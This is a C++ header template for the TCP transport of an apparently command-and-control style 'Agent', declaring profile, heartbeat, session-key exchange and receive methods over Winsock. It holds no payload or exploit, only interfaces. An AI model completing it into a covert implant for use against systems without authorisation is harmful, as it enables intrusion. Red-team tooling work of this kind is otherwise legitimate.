// __NAME__ Agent — TCP Connector
//
// Concrete Connector implementation for raw TCP transport.
// The base template accepts a simple textual profile: "host:port".

#pragma once

#include <winsock2.h>
#include <ws2tcpip.h>

#include "Connector.h"

class ConnectorTCP : public Connector
{
private:
    BYTE* recvBuffer = nullptr;
    int   recvLen    = 0;
    WORD  port       = 0;
    SOCKET clientSocket = INVALID_SOCKET;
    BOOL   wsaStarted   = FALSE;
    char   host[256]    = "127.0.0.1";

public:
    ConnectorTCP();
    ~ConnectorTCP();

    BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
    void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
    BYTE* RecvData() override;
    int   RecvSize() override;
    void  RecvClear() override;
    void  CloseConnector() override;
};
